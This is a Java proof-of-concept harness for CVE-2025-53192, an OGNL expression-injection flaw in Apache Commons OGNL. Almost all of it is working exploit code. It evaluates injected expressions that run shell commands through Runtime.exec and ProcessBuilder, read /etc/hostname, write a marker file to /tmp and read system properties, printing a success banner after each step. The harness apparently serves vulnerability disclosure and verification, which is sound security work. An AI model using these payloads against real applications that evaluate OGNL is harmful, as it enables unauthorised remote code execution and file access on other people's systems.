/*
 * CVE-2025-53192 PoC Harness
 *
 * Demonstrates unrestricted OGNL expression injection in Apache Commons OGNL.
 * The library's DefaultClassResolver loads ANY class via ClassLoader.loadClass()
 * with zero restrictions, and DefaultMemberAccess only checks Java visibility
 * modifiers (not class-level deny lists). This allows arbitrary code execution.
 *
 * Attack vectors demonstrated:
 *   1. Static method invocation:  @java.lang.Runtime@getRuntime().exec()
 *   2. Constructor + method chain: new ProcessBuilder(...).start()
 *   3. File system access:         new java.util.Scanner(new java.io.File(...))
 */

import org.apache.commons.ognl.Ognl;
import org.apache.commons.ognl.OgnlContext;
import org.apache.commons.ognl.DefaultClassResolver;
import org.apache.commons.ognl.DefaultTypeConverter;
import org.apache.commons.ognl.DefaultMemberAccess;

import java.io.BufferedReader;
import java.io.InputStreamReader;

public class OgnlRCEHarness {

    private static final String RESET  = "\033[0m";
    private static final String RED    = "\033[1;31m";
    private static final String GREEN  = "\033[1;32m";
    private static final String YELLOW = "\033[1;33m";
    private static final String CYAN   = "\033[1;36m";

    public static void main(String[] args) throws Exception {
        System.out.println(CYAN + "=== CVE-2025-53192: Apache Commons OGNL Expression Injection ===" + RESET);
        System.out.println(YELLOW + "Library: Apache Commons OGNL 4.0-SNAPSHOT (all versions affected)");
        System.out.println("Root Cause: Unrestricted class loading + method invocation in OGNL engine");
        System.out.println("Impact: Remote Code Execution (RCE)" + RESET);
        System.out.println();

        // Create OGNL context with default (unrestricted) settings
        DefaultMemberAccess memberAccess = new DefaultMemberAccess(false);
        OgnlContext context = new OgnlContext(
            new DefaultClassResolver(),
            new DefaultTypeConverter(),
            memberAccess
        );
        context.setRoot(new Object());

        // ===== VECTOR 1: Static Method Invocation =====
        System.out.println(CYAN + "[Vector 1] Static Method Invocation: @java.lang.Runtime@getRuntime().exec()" + RESET);
        String expr1 = "@java.lang.Runtime@getRuntime().exec(new java.lang.String[]{\"sh\",\"-c\",\"id\"})";
        System.out.println("  Expression: " + expr1);
        try {
            Object tree1 = Ognl.parseExpression(expr1);
            Object result1 = Ognl.getValue(tree1, context, context.getRoot());
            // result1 is a Process object
            Process proc1 = (Process) result1;
            BufferedReader reader1 = new BufferedReader(new InputStreamReader(proc1.getInputStream()));
            String line;
            System.out.print("  " + RED + "OUTPUT: ");
            while ((line = reader1.readLine()) != null) {
                System.out.print(line);
            }
            System.out.println(RESET);
            proc1.waitFor();
            System.out.println("  " + GREEN + "[SUCCESS] RCE via Runtime.exec() confirmed!" + RESET);
        } catch (Exception e) {
            System.out.println("  [FAILED] " + e.getMessage());
        }
        System.out.println();

        // ===== VECTOR 2: Constructor + Method Chain (ProcessBuilder) =====
        System.out.println(CYAN + "[Vector 2] Constructor Invocation: new ProcessBuilder(...).start()" + RESET);
        String expr2 = "(new java.lang.ProcessBuilder(new java.lang.String[]{\"sh\",\"-c\",\"whoami\"})).start()";
        System.out.println("  Expression: " + expr2);
        try {
            Object tree2 = Ognl.parseExpression(expr2);
            Object result2 = Ognl.getValue(tree2, context, context.getRoot());
            Process proc2 = (Process) result2;
            BufferedReader reader2 = new BufferedReader(new InputStreamReader(proc2.getInputStream()));
            String line;
            System.out.print("  " + RED + "OUTPUT: ");
            while ((line = reader2.readLine()) != null) {
                System.out.print(line);
            }
            System.out.println(RESET);
            proc2.waitFor();
            System.out.println("  " + GREEN + "[SUCCESS] RCE via ProcessBuilder confirmed!" + RESET);
        } catch (Exception e) {
            System.out.println("  [FAILED] " + e.getMessage());
        }
        System.out.println();

        // ===== VECTOR 3: File System Access =====
        System.out.println(CYAN + "[Vector 3] File System Access: Reading /etc/hostname" + RESET);
        String expr3 = "new java.util.Scanner(new java.io.File(\"/etc/hostname\")).useDelimiter(\"\\\\A\").next()";
        System.out.println("  Expression: " + expr3);
        try {
            Object tree3 = Ognl.parseExpression(expr3);
            Object result3 = Ognl.getValue(tree3, context, context.getRoot());
            System.out.println("  " + RED + "OUTPUT: " + result3.toString().trim() + RESET);
            System.out.println("  " + GREEN + "[SUCCESS] Arbitrary file read confirmed!" + RESET);
        } catch (Exception e) {
            System.out.println("  [FAILED] " + e.getMessage());
        }
        System.out.println();

        // ===== VECTOR 4: Proof marker (write file) =====
        System.out.println(CYAN + "[Vector 4] File Write: Creating /tmp/cve-2025-53192-pwned" + RESET);
        String expr4 = "@java.lang.Runtime@getRuntime().exec(new java.lang.String[]{\"sh\",\"-c\",\"echo CVE-2025-53192-RCE-CONFIRMED > /tmp/cve-2025-53192-pwned\"})";
        System.out.println("  Expression: " + expr4);
        try {
            Object tree4 = Ognl.parseExpression(expr4);
            Object result4 = Ognl.getValue(tree4, context, context.getRoot());
            Process proc4 = (Process) result4;
            proc4.waitFor();
            // Verify the file was created
            String verifyExpr = "new java.util.Scanner(new java.io.File(\"/tmp/cve-2025-53192-pwned\")).useDelimiter(\"\\\\A\").next()";
            Object tree4v = Ognl.parseExpression(verifyExpr);
            Object result4v = Ognl.getValue(tree4v, context, context.getRoot());
            System.out.println("  " + RED + "File contents: " + result4v.toString().trim() + RESET);
            System.out.println("  " + GREEN + "[SUCCESS] Arbitrary file write confirmed!" + RESET);
        } catch (Exception e) {
            System.out.println("  [FAILED] " + e.getMessage());
        }
        System.out.println();

        // ===== VECTOR 5: System info exfiltration =====
        System.out.println(CYAN + "[Vector 5] System Property Access: java.version, os.name" + RESET);
        String expr5 = "@java.lang.System@getProperty(\"java.version\")";
        System.out.println("  Expression: " + expr5);
        try {
            Object tree5 = Ognl.parseExpression(expr5);
            Object result5 = Ognl.getValue(tree5, context, context.getRoot());
            System.out.println("  " + RED + "Java Version: " + result5 + RESET);

            String expr5b = "@java.lang.System@getProperty(\"os.name\")";
            Object tree5b = Ognl.parseExpression(expr5b);
            Object result5b = Ognl.getValue(tree5b, context, context.getRoot());
            System.out.println("  " + RED + "OS Name: " + result5b + RESET);
            System.out.println("  " + GREEN + "[SUCCESS] System property exfiltration confirmed!" + RESET);
        } catch (Exception e) {
            System.out.println("  [FAILED] " + e.getMessage());
        }
        System.out.println();

        System.out.println(CYAN + "=== All vectors tested. Vulnerability confirmed. ===" + RESET);
        System.out.println(YELLOW + "Root cause: DefaultClassResolver.classForName() loads ANY class");
        System.out.println("            DefaultMemberAccess.isAccessible() only checks visibility modifiers");
        System.out.println("            No class-level deny list, no SecurityManager check by default" + RESET);
    }
}
